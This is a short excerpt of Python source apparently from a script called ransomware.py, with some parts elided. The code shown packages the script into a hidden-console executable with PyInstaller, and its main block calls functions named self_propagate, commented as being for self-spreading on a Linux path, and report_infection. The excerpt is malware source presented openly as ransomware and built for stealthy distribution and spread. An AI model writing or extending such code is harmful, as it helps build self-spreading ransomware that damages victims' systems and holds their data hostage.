...
# Generate or save EXE file
def generate_exe():
    exe_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "ransomware")
    if not os.path.exists(exe_path):  # Make sure not to overwrite if already exists
        print("Compiling script to EXE...")
        subprocess.run(["pyinstaller", "--onefile", "--noconsole", "ransomware.py"])
    else:
        shutil.copy("dist/ransomware", exe_path)
        print(f"EXE saved at {exe_path}")
...
if __name__ == "__main__":
    ...
    generate_exe()
    self_propagate("/home/user/Public/ransomware")  # Example Linux path for self-spreading
    report_infection()
